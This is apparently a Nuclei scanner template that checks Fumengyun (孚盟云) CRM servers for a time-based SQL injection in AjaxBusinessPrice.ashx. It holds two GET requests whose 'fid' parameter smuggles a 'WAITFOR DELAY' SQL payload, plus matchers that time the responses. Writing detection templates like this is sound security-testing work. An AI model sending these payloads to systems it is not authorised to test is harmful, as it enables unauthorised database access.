id: fumengyun-AjaxBusinessPrice_ashx-sql-time

info:
  name: 孚盟云 AjaxBusinessPrice.ashx SQL延时注入漏洞
  author: fumengyun
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        GET /m/Dingding/Ajax/AjaxBusinessPrice.ashx?action=GetBmailByFid&fid=-1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /m/Dingding/Ajax/AjaxBusinessPrice.ashx?action=GetBmailByFid&fid=-1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and